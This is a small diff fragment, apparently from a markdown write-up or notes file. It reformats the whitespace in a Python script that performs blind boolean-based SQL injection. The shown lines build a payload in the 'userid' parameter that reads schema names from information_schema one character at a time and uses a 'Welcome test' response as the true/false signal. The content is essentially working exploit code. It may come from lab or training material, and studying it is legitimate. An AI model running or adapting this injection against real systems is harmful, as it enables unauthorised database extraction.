@@ -372,9 +372,9 @@ for i in range(RESULT_LENGTH):
         if REQUEST.text == 'Welcome test': DATABASE_NAME_LENGTH = j
     for j in range(DATABASE_NAME_LENGTH):
         for s in string.printable.strip():
-            QUERY       = requests.utils.quote(f'test\' AND ASCII(SUBSTR((SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT {i},1),{j+1},1))={ord(s)}#')
-            URL         = TARGET + f'?userid={QUERY}&password=123'
-            REQUEST     = requests.get(url=URL)
+            QUERY   = requests.utils.quote(f'test\' AND ASCII(SUBSTR((SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT {i},1),{j+1},1))={ord(s)}#')
+            URL     = TARGET + f'?userid={QUERY}&password=123'
+            REQUEST = requests.get(url=URL)
             if REQUEST.text == 'Welcome test': DATABASE_NAME += s
     print(f'{DATABASE_NAME}')
 ```
